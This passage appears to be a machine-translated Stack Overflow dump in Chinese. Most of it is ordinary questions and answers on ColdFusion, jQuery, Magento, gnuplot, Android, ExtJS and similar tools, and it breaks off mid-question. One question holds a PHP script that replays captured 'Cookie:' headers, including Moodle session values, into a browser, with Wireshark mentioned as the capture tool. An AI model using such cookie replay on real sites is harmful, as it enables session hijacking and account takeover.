其次，您可以将当前页面的上下文发送到删除文件（subFolderPath 变量），在重定向时将其添加到 cflocation。看起来你已经有了 url.folder 变量，所以你可以这样做：

```
<cflocation url="#buildUrl('main.files', "subfolderPath=#rc.folder")#" /> 
```

看起来您使用的是 FW/1，所以我假设 'buildURL()' 像宣传的那样工作，并且您的 url 和表单变量在`rc`范围内。

从 cflocation 返回到初始页面后，您将希望将选择放回您选择的文件夹中。在创建`<option>`标签的循环中，添加检查以查看是否应选择选项。我通常会做这样的事情：

```
<option value="..." <cfif listLast(rc.subFolderPath,"\") EQ name>selected</cfif>>#name#</option> 
```

# mfc-feature-pack - MFC 应用程序工具栏上禁用的按钮的灰色图像

> ID：13313339
> 
> 赞同：1
> 
> 时间：2012-11-09T17:51:02.420
> 
> 标签：mfc-feature-pack

我在 MFC 应用程序中遇到问题当我更改 Windows 7 的 DPI 然后我注销我的计算机当 Windows 启动时，我打开我的应用程序我的问题如下：被禁用的工具栏按钮没有变灰图像这个图像按钮未变灰。我找到了很多关于 DPI 和 MFC 的网站，但我没有找到任何关于这个问题的文章

stackoverflow 的成员可以帮助我吗？非常感谢。

# ruby-on-rails - 如何确定 Sunspot 查询的范围？

> ID：13313341
> 
> 赞同：1
> 
> 时间：2012-11-09T17:51:02.403
> 
> 标签：ruby-on-rails, solr, scope, sunspot

我对这个片段的问题是它返回一个整数，这意味着在其他帐户中共享`-1`的通用。`Message`

```
 def build_results
    search = Sunspot.new_search(Message) do
      any_of do
        member.lists.map { |list| with :enterprise_list_id, list.search_id }
      end 
```

我如何添加到此语句以查询所有消息，`-1`但`search_id`将其限定为仅属于它`member.account`？

我正在尝试将其范围限定为：

```
searchable :include => :repliable do
  integer :account_id do
    repliable.try(:account_id)
  end 
```

和..

```
def build_results
  search = Sunspot.new_search(Message) do

    with :account_id, member.account_id 
```

但是，即使我知道有一个应该返回的搜索结果，因为它们共享一个 commont ，但这不会返回任何内容`account_id`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T19:34:37.137

如果我正确理解了您的问题，那么您只需在您的消息可搜索块中添加此语句。

```
searchable do
  integer :some_search_ids, :multiple => true do
     member.lists.map { |list| list.search_id} if member.present?
  end

  integer :member_account_id do
    member.account_id if member.present?
  end
end 
```

然后，

```
def build_results
  search = Sunspot.new_search(Message) do
    with(:some_search_ids, some_list_search_id)
    with(:member_account_id, some_member_account_id)
  end
end 
```

# windows-8 - Windows 8 分组项目页面无内容显示

> ID：13313342
> 
> 赞同：0
> 
> 时间：2012-11-09T17:51:07.647
> 
> 标签：windows-8

在我的 Windows 8（现代 UI）应用程序中，我想添加一个 GroupedItemsPage。当我将它添加为我的主页时，一切都显示出来了，并且显示了模板的示例数据。但是当我想将它添加为一个附加页面时，我通过我的 MainPage 导航到，内容不会显示。我只看到标题，但现在根本看不到元素。谁能帮我这个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-30T13:03:17.063

你能提供一些示例代码吗？您可能将某些内容与数据绑定或导航混为一谈。

# php - 在 xajax 上创建新元素

> ID：13313343
> 
> 赞同：0
> 
> 时间：2012-11-09T17:51:09.253
> 
> 标签：php, javascript, xajax

大家好，又是我的。也许这是一个愚蠢的问题，但我可以做到：>

我需要在我的 xajax 函数中创建一个 div 对象。我这样做

```
$response->create("parent id","The name of the new element","new id"); 
```

到目前为止，一切都很好。接下来，我像这样为我的新对象分配一个属性

```
$response->assign("new id","style.display","block") 
```

到目前为止还不错。我的问题是想要创建一个属性。这是我的代码

```
$response->assign("new id","class","name of my class"); 
```

在 html 中是这样的`<div id="p-new id" class="name of my class">`

但我不能这样做。任何建议都很好

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-23T08:29:30.550

记得 `->assign(*id*, *prop*, *value*)`翻译成 `document.getElementById(*id*).*prop* = *value*;`

因为*class*是 Javascript 中的保留字，所以 class 属性由 property 处理`className`。

所以`$response->assign("new id","className","name of my class");` 会起作用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T02:27:05.633

为什么不在一行中创建整个对象，例如：

```
$response->assign("parent-id","innerHTML","<div id='p-new id' class='name of my class'>"); 
```

或者如果您不能更改父 ID 内 HTML 创建：首先是新 ID div：

```
$response->create("parent-id","The name of the new element","new-id"); 
```

然后分配它的 innerHTML 新 div：

```
$response->assign("parent-id","innerHTML","<div class='name of my class'></div>"); 
```

不幸的是你会得到结构

```
<div id="p-new id"> <class="name of my class"></div> </div> 
```

不是你想要的

```
<div id="p-new id" class="name of my class"></div> 
```

但是你可以根据自己的需要调整这个想法并创造类似的东西

```
<div id="outer-sth"><div id="p-new id" class="name of my class"></div></div> 
```

我相信这与您的要求足够接近。

# jquery - jquery更新时间

> ID：13313348
> 
> 赞同：0
> 
> 时间：2012-11-09T17:51:40.893
> 
> 标签：jquery

```
jQuery(document).ready(function() {
function updateTime() {
    $("#wtime").append('<p>Wacht nog: <?php echo $wait_time; ?></p> '); 
}

updateTime();
setInterval(updateTime, 1000); }); 
```

我想每秒更新一次 div #wtime 现在它只显示时间而不是更新它

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T17:55:56.840

您必须将从服务器获取的时间解析为 javascript`Date()`对象，然后每秒递增一次。

这是一个工作[小提琴](http://jsfiddle.net/Hdsyt/11/)：

```
// Make sure $wait_time has a valid format so that Date() can parse it.
// var serverTime  = new Date('<?php echo $wait_time; ?>');
var serverTime = new Date();

function updateTime() {
    /// Increment serverTime by 1 second and update the html for '#time'
    serverTime = new Date(serverTime.getTime() + 1000);
    $('#time').html(serverTime.toGMTString());
}

$(function() {
    updateTime();
    setInterval(updateTime, 1000);
});​ 
```

相关HTML：

```
<div id="wtime">
    <p>Wacht nog: <span id="time"></span></p>        
</div>​ 
```

希望能帮助到你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-23T19:47:22.740

我的小测试。

```
 <!DOCTYPE html>
  <head>
  <html> 
  <head> 
  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script> 
  <script> 
  $(document).ready(function(){
  function updateTime() {
  var currtime = new Date();
  var currtime1 = new Date(currtime.getTime());
  var currtime2 = new Date(currtime.toGMTString());
  var currtime3 = (currtime.getHours() + ":"+ currtime.getMinutes() + ":" + currtime.getSeconds());
  $('#1').html(currtime1);
  $('#2').html(currtime2);
  $('#3').html(currtime3);       
  }
  setInterval(updateTime, 1000); // 1000 miliseconds 
  }); 
  </script> 
  </head> 
  <body>
  <h1>
  <b> 
  <div id="1">The Current time is: </div>
  </br>
  <div id="2">The Current time is: </div>
  </br>
  <div id="3">The Current time is: </div>
  </b> 
  </h1> 
  </body> 
  </html> 
```

# opencv - 与安装 OPENCV 2.4.2 冲突

> ID：13313349
> 
> 赞同：-2
> 
> 时间：2012-11-09T17:51:41.997
> 
> 标签：opencv, installation

我下载了 OpenCV-2.4.2，但在那里找不到任何 exe（自动运行）文件。我如何将其解压缩到我的 C:\ 目录中，并在此视频中遵循以下过程>> [https://www。 youtube.com/watch?v=cgo0UitHfp8&feature=plcp](https://www.youtube.com/watch?v=cgo0UitHfp8&feature=plcp)

我有 VS 2008 版本。根据视频，我首先将 OpenCV 添加到系统变量中，然后构建 Visual Studio 项目。添加所有库并根据视频完成。

但是当我调试我的项目时，它说>>应用程序无法启动，因为找不到 tbb_debug.dll。

所以;

1）我的安装或这个视频有什么问题吗？

2）我是否正确完成了安装过程？

如果您尽快回复，我必须感谢您。

感谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:16:00.113

您缺少 tbb_debug.dll（或它不在您的路径中[）](http://threadingbuildingblocks.org/file.php?fid=77) opencv bin 文件夹）

# javascript - 从自定义事件创建的对象未定义

> ID：13313355
> 
> 赞同：1
> 
> 时间：2012-11-09T17:52:21.573
> 
> 标签：javascript, jquery, javascript-events

我正在尝试调试我的问题。我导入了一个同事编写的库，该库将从播放列表中提取 YouTube URL。一旦这个库完成了提取过程，它将触发事件`playlistDone`并将 YouTube URLs 放在 object 中`OBJ.youtube.videos`。由于我的网站非常庞大且复杂，因此我在一个空白网站上测试了这个库以验证它是否正常工作。

```
$(document).on('playlistDone', function() {
    console.log( 'done' );
    console.log( OBJ.youtube.videos );
}); 
```

当我将上面的代码移至我的网站时，控制台会确认`playlistDone`自定义事件，但报告`OBJ.youtube.videos`未定义。任何人都可以就为什么会发生这种情况提供任何建议吗？

我用于测试的空白页示例：

```
<!DOCTYPE html>
<html>
    <head>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
    </head>
    <body>
    <div>
        <h1>Video</h1>
        <div id="player" style="width:650px; height:400px;"></div>
        <hr />
        <div style="width:650px; height:80px; border:solid 2px #e8e; overflow:horizontal" id="thumbnails"></div>
    </div>
    <script src="youtube-playlist-lib.js?playlistId=PLA249A8D68B9C95F7&dom=player&thumbnails=thumbnails"></script>
    <script type="text/javascript">
        $(document).on('playlistDone', function() {
           console.log( 'done' );
           console.log( OBJ.youtube.videos );
        }); 
    </script>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:16:32.233

`OBJ.youtube.video`创建于`youtube-playlist-lib.js`. 因此，如果您在包含之前尝试使用它，`youtube-playlist-lib.js`则会收到错误消息，因为您在未设置时尝试使用它。

确保在包含**后**使用它`youtube-playlist-lib.js`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-10T03:22:41.323

事实证明，代码没有任何问题。相反，Chrome 正在缓存旧版本的库。

# html - 使用 libxml2 解析 HTML 会产生实体引用问题

> ID：13313365
> 
> 赞同：2
> 
> 时间：2012-11-09T17:52:53.123
> 
> 标签：html, c, libxml2

我正在尝试编写一个小程序来使用 libxml2 从网页中提取一些数据。由于数据在 HTML 文件中是本地的，因此我决定使用以下内容作为起点，将 HTML 转换为可遍历的内存结构：

```
int main(int argc, char* argv[])
{
    htmlDocPtr dp = htmlReadFile(argv[1], NULL, HTML_PARSE_RECOVER | HTML_PARSE_NONET ); 
```

但是，当我运行这个将 HTML 文件作为参数传递时，我得到一个错误：

```
HTML parser error : htmlParseEntityRef: expecting ';' 
```

它似乎在抱怨以下内容：

```
<a href="do_something.html?a=1&b=2"> some stuff </a> 
```

即，与其忽略`href`属性的内容或将其视为带有参数的 URL，它似乎将来自的位`&b`视为像*&name;这样的实体引用。*并抱怨没有分号。这肯定不对吧？我应该做一些不同的事情来让它忽略这个（无论如何我对这些标签都不感兴趣）还是我只是以某种方式错过了重点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T21:41:45.160

您的输入文件无效，因为它包含无效的 url。请参阅[RFC 3986 - 保留字符中的第 2.2 点](https://www.rfc-editor.org/rfc/rfc3986#section-2.2)。应该使用百分号转义和问号来转义与号。合法的 url 如下所示：

```
<a href="do_something.html%3Fa%3D1%26b%3D2"> some stuff </a> 
```

但这只是尝试解析 html 时的一长串陷阱之一。通常的方法是使用一个整理库，见这个问题：[Parse html using C](https://stackoverflow.com/q/1527883/772981)。目标是在实际解析之前清除 html 中的错误。

# wordpress - 隐藏 Magento 前端产品页面上的空白选项卡

> ID：13313368
> 
> 赞同：2
> 
> 时间：2012-11-09T17:53:03.617
> 
> 标签：wordpress, magento, magento-1.7

我们在我们的服务器上安装了 Wordpress 和集成了 Wordpress 和 Magento 的 Fishpig 扩展。我们希望通过将相关帖子添加到前端产品页面（产品描述和追加销售产品所在的位置）上的新选项卡来利用扩展程序关联博客文章和产品的能力。我完成了所有这些工作——产品页面上有一个名为“相关博客文章”的新标签，当被选中时，它会按照我想要的方式显示文章标题和摘录。**问题是，即使没有相关的博客文章，该选项卡也会显示。当它为空时如何隐藏它？**

我可能缺少一些简单的东西。这是我添加标签的方式：

1) 这个文件**app/design/frontend/base/default/layout/wordpress.xml**确定了相关帖子显示在前端产品页面的哪个块。在这个文件的底部附近，我将参考名称从*product.info.additional*更改为 *related_blog_posts*。

2）到文件：**app/design/frontend/default/{template}/layout/catalog.xml**在第210行附近，我放置了以下代码。我把它放在产品描述和产品追加销售的类似代码部分之间。

```
<action method="addTab" translate="title" module="catalog"><alias>related_blog_posts</alias><title>Related Blog Posts</title><block>catalog/product_list_relatedposts</block><template>catalog/product/list/relatedposts.phtml</template></action> 
```

3) 添加新文件：**app/code/local/Mage/Catalog/Block/Product/List/relatedposts.php** 在该文件中添加以下代码：

```
class Mage_Catalog_Block_Product_List_Relatedposts extends Mage_Core_Block_Template
{
    protected $_list;
    public function __construct()
    {
        parent::__construct();
        $this->setTemplate('catalog/product/view/additional.phtml');
    }
    public function getChildHtmlList()
    {
        if (is_null($this->_list)) {
            $this->_list = array();
            foreach ($this->getSortedChildren() as $name) {
                $block = $this->getLayout()->getBlock($name);
                if (!$block) {
                    Mage::exception(Mage::helper('catalog')->__('Invalid block: %s.', $name));
                }
                $this->_list[] = $block->toHtml();
            }
        }
        return $this->_list;
    }
} 
```

4) 添加新文件：**app/design/frontend/default/{template}/template/catalog/product/list/Relatedposts.phtml**并在该文件中添加以下代码：

```
<?php foreach ($this->getChildHtmlList () as $_html): ?>
    <div class="collateral-box">
        <?php echo $_html ?>
    </div>
<?php endforeach; ?> 
```

5）在文件**app/design/frontend/base/default/template/wordpress/post/associated/list.phtml**我更改了以下代码：

```
<ul>
<?php foreach($posts as $post): ?>
    <li>
        <a href="<?php echo $post->getPermalink() ?>" title="<?php echo $this->escapeHtml($post->getPostTitle()) ?>"><?php echo $this->escapeHtml($post->getPostTitle()) ?></a>
    </li>
<?php endforeach; ?>
</ul> 
```

至：

```
<div class="related-posts">
    <?php foreach($posts as $post): ?>
        <h3><a href="<?php echo $post->getPermalink() ?>" title="<?php echo $this->escapeHtml($post->getPostTitle()) ?>"><?php echo $this->escapeHtml($post->getPostTitle()) ?></a></h3>
        <?php $post->setExcerptSize($this->getExcerptLength()) ?>
        <p class="related-post-excerpt"><?php echo $post->getPostExcerpt() ?></p>
    <?php endforeach; ?>
</div> 
```

最后一项更改为每个相关帖子添加了摘录，而不仅仅是显示标题。

6）清除缓存并重新编译站点。

**摘要：**新标签出现在前端产品页面上，相关的博客文章也出现在标签中。但是，即使该产品没有相关的博客文章，该选项卡也会显示。我已经尝试了多种方法在 if/count 条件下包装 Relatedposts.phtml 中的代码，但我无法得到任何工作。没有内容时，如何防止我的新标签出现？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-16T03:44:39.343

我会尝试这样的事情，或者像你提到的某种计数，在

**app/design/frontend/default/{template}/template/catalog/product/list/Relatedposts.phtml**

```
<?php 
if($this->getChildHtmlList()): ?>
    <?php foreach ($this->getChildHtmlList () as $_html): ?>
        <div class="collateral-box">
            <?php echo $_html ?>
        </div>
    <?php endforeach; ?>
<?php endif; ?> 
```

您还需要确保此块不返回任何空白，因为它将被解释为内容并创建选项卡。我也有一个自定义选项卡，这对我来说是个问题。如果你遇到问题，你应该 Zend_Debug::dump() 和 $this->getChildHtmlList() 看看生成了什么。

# gnuplot - gnuplot：绘制具有固定步长的混合频率日志数据

> ID：13313372
> 
> 赞同：0
> 
> 时间：2012-11-09T17:53:08.907
> 
> 标签：gnuplot

我有一个包含时间和值的日志文件，如下所示：

```
1 1
2 1
3 2
4 3
5 3
6 4
10 4
15 4
20 5
25 5 
```

绘制它 ( `with linesp`) 会产生如下内容：

```
5|                                 ,----x---------x
4|         ,x-------x---------x---'
3|     ,x-x
2|   ,x  
1|x-x 
 |___________________________________________________
  1 2 3 4 5 6 _ _ _10 _ _ _ _15 _ _ _ _20 _ _ _ _25 
```

如果我的文件中有很多值，那么左边的点会变得非常拥挤（使用时`with linesp`）。如何设置明确定义的步长（跳过一些拥挤的元组）。例如，我想每 5 秒只绘制一个元组。

```
5|                                 ,----x---------x
4|          ,-------x---------x---'
3|     ,--x'
2|   ,'  
1|--' 
 |___________________________________________________
  1 2 3 4 5 6 _ _ _10 _ _ _ _15 _ _ _ _20 _ _ _ _25 
```

最后，在那些稀疏的元组上，我想添加误差线（我目前在所有点上都有）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T20:07:22.707

您可能可以使用 gnuplot 的内联函数功能来做到这一点，但这会非常棘手，而且如果您想修改它，您将永远无法记住您为使其工作所做的工作。相反，我提出了一个简单的 python 脚本来对数据进行分箱/平均：

```
from collections import defaultdict
from sys import argv

d = defaultdict(list)
binsize = 5
with open(argv[1]) as f:
    for line in f:
        x,y = [int(xx) for xx in line.split()]
        d[x//binsize].append((x,y))

    for k,v in sorted(d.items()):
        xx,yy = map(sum,zip(*v))
        #print float(xx)/len(v),float(yy)/len(v)  #This version puts x value at average of x points in this bin
        print (k+0.5)*binsize, float(yy)/len(v)  #x value is in middle of bin. 
```

它将数据文件作为第一个参数传递，然后将数据打印到标准输出（就像 gnuplot 喜欢的那样）。然后你的绘图文件就变成了：

```
plot '< python cool_script.py datafile' u 1:2 w lp 
```

首先，将 x 值推送到 bin 中心的版本：

![在此处输入图像描述](../Images/260d65c69bbe4c174f674383472c84ef.png)

现在具有从 bin 中所有其他 x vals 平均的 x 值的版本：

![在此处输入图像描述](../Images/1ba7367eb5611c22a25c02c6ea49e178.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T20:18:23.953

我不完全确定你在这里做什么。如果你有整数点，并且你只想在可以被 5 整除的点上放一个点，我们可以很容易地做到这一点：

```
plot 'foo.txt' u 1:2 w l, '' u (int($1)%5==0?$1:NaN):2 w p ls 1 
```

这里的魔法是用三元运算符完成的。 `(int($1)%5 == 0? $1:NaN)`换句话说，如果 x 坐标可以被 5 整除（在转换为整数之后），则绘制该点，否则不绘制。

当然，如果您的数据文件 x 点是`1,4,6,12`因为没有一个点会被绘制（没有一个可以被 5 整除），那么您会遇到麻烦。如果是这种情况，我们可以编写一个真正的基本脚本，使用与我在另一篇文章中使用的基本相同的技术对这些点进行插值。

# authentication - 身份验证和 OpenGraph

> ID：13313374
> 
> 赞同：1
> 
> 时间：2012-11-09T17:53:19.203
> 
> 标签：authentication, facebook-opengraph

这是我第一次尝试使用 facebook 应用程序和 OpenGraph。我在developers.facebook.com 上遵循了这个例子。到目前为止，一切都很好。

**我想做的是：** 单击某个图像时，请检查用户是否已登录并已对您的应用程序进行身份验证。我希望用户能够在不经过身份验证的情况下使用该页面。只有一项特定操作（单击该图像）需要用户进行身份验证。

1.  如果用户已登录并已对您的应用进行身份验证，则在用户的流上发布一条消息。
2.  如果用户未登录和/或未对您的应用进行身份验证，则在用户单击图像时显示身份验证对话框。接受后，在用户的信息流上发布消息。

`<a onclick="fb_login();" href="#" class="productlink1"><img id="product1" onclick="postCook()" alt="" src="img/fressko_heart_black.png"/></a> <a class="productlink2"><img id="product2" alt="" src="img/fressko_checked_black.png"/></a>`

我知道这不是最终的代码，特别是因为它有两个 onclick="" 会同时触发。所以，我需要一个不同的解决方案。

发布在用户提要上的 JavaScript 函数如下所示：

```
 function postCook()
  {
      FB.api(
        '/me/xxxxxx:cook',
        'post',
        { recipe: 'http://www.zzzzzzz.com/test/' },
        function(response) {
           if (!response || response.error) {
              alert('Error occured');
           } else {
              alert('Cook was successful! Action ID: ' + response.id);
           }
        });
  } 
```

验证用户的 JavaScript 如下所示：

```
window.fbAsyncInit = function() {
FB.init({
    appId   : 'xxxxxx',
    oauth   : true,
    status  : true, // check login status
    cookie  : true, // enable cookies to allow the server to access the session
    xfbml   : true // parse XFBML
});};

 function fb_login(){
FB.login(function(response) {

    if (response.authResponse) {
        console.log('Welcome!  Fetching your information.... ');
        //console.log(response); // dump complete info
        access_token = response.authResponse.accessToken; //get access token
        user_id = response.authResponse.userID; //get FB UID

        FB.api('/me', function(response) {
            user_email = response.email; //get user email
      // you can store this data into your database             
        });
    } else {
        //user hit cancel button
        console.log('User cancelled login or did not fully authorize.');
    }
}, {
    scope: 'publish_stream'
});
}(function() {
var e = document.createElement('script');
e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
e.async = true;
document.getElementById('fb-root').appendChild(e);}()); 
```

有人对我的问题有什么好的解决方案吗？或者朝正确的方向踢。我通常更喜欢使用 PHP，但对于这个任务，JavaScript 似乎是首选的武器。

问候，

# spring - 使用 Spring Hibernate jsp mySQL 进行用户注册

> ID：13313375
> 
> 赞同：0
> 
> 时间：2012-11-09T17:53:22.570
> 
> 标签：spring, hibernate, jsp

我的 Applicatoin 基于 Spring 3、Hibernate、JSP 和 MySQL DB

在注册用户时，我想检查数据库中是否存在用户名。实现这一目标的最佳方法是什么？有人可以提供示例或参考其他帖子吗？

## 到目前为止，我已经尝试过以下内容

在提交页面时，我在控制器中有一个服务调用，它返回用户对象（如果存在用户名），否则返回 null。即“公共用户userService.getUser(userName)”

1.  我不知道如何将消息传递给 jsp 所以发布此消息
2.  我不确定这是否是正确的方法？不请推荐更好的

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:05:30.173

我将`ajax`通过调用控制器内部的 this 函数来检查用户是否存在，如果用户已经存在，则显示相应的消息。

```
public boolean isUserExist(String userName)
{
return userDao.isExist(userName);
} 
```

# jira - JIRA 将工单标记为已接受/确认

> ID：13313381
> 
> 赞同：2
> 
> 时间：2012-11-09T17:53:47.660
> 
> 标签：jira, jira-plugin

我一直在寻找一种方法让用户在将票分配给他们后确认票。我不知道这是否是一个内置功能，或者是否有一个插件会创建一个状态/按钮，供用户在将票放入队列后接受票。我希望从工作流或开始进度的工单窗口中看到类似的内容，但是没有多少对配置设置的挖掘可以使任何相关的事情发生。

有谁知道 JIRA 中的这个附加功能？非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:10:03.100

我通过自定义工作流程步骤做到了这一点。在问题到达受让人（状态为`New`）后，他/她应将其移至另一个步骤（状态为`Open`）。在他/她这样做之前，该问题被视为未注意到/到达受让人。此外，我有一份报告显示`New`超过预定义时间段的状态问题。

我不知道执行类似任务的现成插件（也许，我应该深入研究我关于 Atlassian 答案的帖子，以发现其他解决方案的一些线索）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:07:44.390

正如@Stan 上面所说，自定义工作流程是实现这一点的方法。JIRA 中的工作流功能非常灵活，因此有一些学习曲线，但[Atlassian 的文档](https://confluence.atlassian.com/display/JIRA051/Configuring+Workflow)非常好。如果您需要帮助，请在此处回复。

# android - 在 Android 中拨打由 GooglePlaces 提供的电话号码

> ID：13313384
> 
> 赞同：0
> 
> 时间：2012-11-09T17:54:01.320
> 
> 标签：android, android-intent, google-places-api

因此，使用谷歌地点参考（详细的网络服务）我检索了一个“格式化的电话号码”，其格式为（256）922-0556。目标是拨打这个号码。我正在尝试的方式是使用意图。但是，上面的数字并不是一个使用 Uri 解析方法的格式。有人知道拨打此号码的解决方案吗？是否有不同的意图或好方法将其转换为 Uri 数据？我见过与此相反的做法：1234567890 → (123) 456-7890

```
 String formattedNumber = PhoneNumberUtils.formatNumber(unformattedNumber); 
```

但我想做相反的事情。任何想法或替代解决方案？这是我的代码：

```
protected void onPostExecute(Boolean result){
                Intent callintent = new Intent(Intent.ACTION_CALL);
                callintent.setData(Uri.parse(phoneNum));
                try {
                    startActivity(callintent);
                }catch (Exception e) {e.printStackTrace();}
            } 
```

其中 phoneNum 是通过 JSON 从 GooglePlaces 检索到的格式化电话号码字符串

扩展 Peotropo 的评论：有没有比以下更好的方法来替换值？

```
phoneNum = phoneNum.replace(" ", ""); // gets rid of the spaces
phoneNum = phoneNum.replace("-", ""); // gets rid of the -
phoneNum = phoneNum.replace("(", ""); // gets rid of the (
phoneNum = phoneNum.replace(")", ""); // gets rid of the ) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:35:48.047

这是简单的字符串。使用 String.replace() 方法删除多余的字符。您还可以使用 replaceAll 方法：

```
String phoneNumber = "(123)123-456465"
return phoneNumber.replaceAll("[^0-9]", ""); 
```

未测试的文档在这里： [replaceAll](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/String.html#replaceAll%28java.lang.String,%20java.lang.String%29)

[Java 正则表达式](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/regex/Pattern.html#sum)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T04:24:18.633

您不需要进行字符串替换。您可以使用下面的 Spannable 代码让您的手机自动识别并拨打该号码。它会针对括号、空格和破折号进行调整。

```
 // call the phone
 SpannableString callphone = new SpannableString("Phone: " + phone);
 callphone.setSpan(new StyleSpan(Typeface.BOLD), 0, 6, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
 callphone.setSpan(new URLSpan("tel:"+phone), 7, 21, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
 TextView zphone = (TextView) findViewById(R.id.phone);
 zphone.setText(callphone);
 zphone.setMovementMethod(LinkMovementMethod.getInstance()); 
```

它会显示

```
 Phone: (123) 456-7890 
```

您在上面的代码中看到 7,21 表示从第 8 个字符开始，即 ( 并在第 21 个字符结束，即电话号码中的最后一个数字。调整它以显示您想要的方式。没什么特别的在你看来要做：

```
 <!-- Phone Number Label -->
 <TextView
    android:id="@+id/phone"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:layout_marginTop="5dip"/> 
```

# php - 使用 PHP 注入 cookie 不会产生相同的 cookie

> ID：13313387
> 
> 赞同：2
> 
> 时间：2012-11-09T17:54:15.443
> 
> 标签：php, http, cookies, http-headers, setcookie

我正在尝试制作一个 PHP 脚本，通过首先从文件中读取它们来为浏览器设置 cookie。在文件中是一段 HTTP 标头“Cookie: x=foo; y=bar; etc”。该脚本对字符串进行了清理，因此我们最终只得到了变量名 (x) 和变量值 (foo)。问题是当我从文件中设置 cookie 时，使用 Wireshark 我看到了发送到 broser 的变量的确切值。当我看到浏览器向页面发送了哪些 cookie 时，它​​们是不同的，即我设置 cookie x=foo;，然后浏览器将其作为 Cookie:x=bar 发送回页面。你知道这可能是什么原因吗？当我使用 Greasemonkey 脚本注入 cookie 时，一切都很好。这是我的代码：

```
<?php
    function inject($what)
    {
        for($i=0;$i<count($what);$i++)
        {
            $name = $what[$i][0];
            echo "injecting cookie named \"$name\" .... <br> ";
            setrawcookie($what[$i][0], $what[$i][1]);
        }
    echo 'all cookies injected properly, ready';
    }

    $newcook=file("/home/todor/cook.txt");
    echo '<pre>';
    for ($i=0; $i<count($newcook); $i++)
        $newcook[$i] = str_replace('Cookie: ', '', $newcook[$i]);      
    $newcook = explode('; ', $newcook[0]);

    for($i=0;$i<count($newcook);$i++)
        $newcook[$i] = explode('=', $newcook[$i]);
    for($i=0;$i<count($newcook);$i++)
        echo 'cookie variable name "'.$newcook[$i][0].'" with value of "'.$newcook[$i][1].'"<br>';

    echo '</pre>';
    inject($newcook);
    ?>

---------------Cookies being set----------------------

Set-Cookie: MoodleSession=h0j51hvrkvu30mdeu3d9321thit8c8pdkle66llr2lipj80chjb0
Set-Cookie: __utma=16796069.1074685784.1352477410.1352477410.1352477410.1
Set-Cookie: __utmc=16796069
Set-Cookie: __utmz=16796069.1352477410.1.1.utmcsr

---------------Cookies being sent to the server -----------

Cookie: MoodleSession=hn92mn8vhl6kvg7f8qogpgm8reeisnoope27o7q3ivrecnr84gb1; __utma=16796069.1720416199.1352484234.1352484234.1352484234.1; __utmb=16796069.1.10.1352484234; __utmc=16796069; __utmz=16796069.1352484234.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none) 
```

# extjs - extjs 3中时间24小时格式的正则表达式

> ID：13313388
> 
> 赞同：0
> 
> 时间：2012-11-09T17:54:17.480
> 
> 标签：extjs, extjs4, extjs3

我的正则表达式有点弱。谁能帮我在 extjs 中找到时间的正则表达式（24 小时格式）

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T18:19:46.053

如果没有必要，不要重新发明轮子。Sencha 的优秀人员经历了很多麻烦，因此像我们这样的开发人员不必搞砸这类事情。

```
// returns null if parse failed, or Date object is successful
var mydate = Ext.Date.parse(inputString, "G:i"); 
```

有关更多信息，请查看[Ext.Date的 API 文档](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.Date)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T17:55:51.010

这可能是您正在寻找的：

```
'/^([0-9]|0[0-9]|1[0-9]|2[0-3]):[0-5][0-9]$/' 
```

不确定它是否适用于 extis，如果不是，您可以随时将其翻译回 extis 中使用的语法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-09T18:01:24.673

试用

```
^(20|21|22|23|[01]\d|\d)(([:][0-5]\d){1,2})$ 
```

或者你可以使用

```
([01]?[0-9]|2[0-3]):[0-5][0-9] 
```

有关更多信息，请访问[教程](http://www.mkyong.com/regular-expressions/how-to-validate-time-in-24-hours-format-with-regular-expression/)

# java - 无法转换为 JSONArray 以在 ListView 中显示

> ID：13313389
> 
> 赞同：1
> 
> 时间：2012-11-09T17:54:19.747
> 
> 标签：java, php, json

我正在尝试将 json 数组从 Internet 转换为 listview。服务器中的 php 代码正常工作并返回下面的 json 字符串。logcat 中的结果 json 是：

```
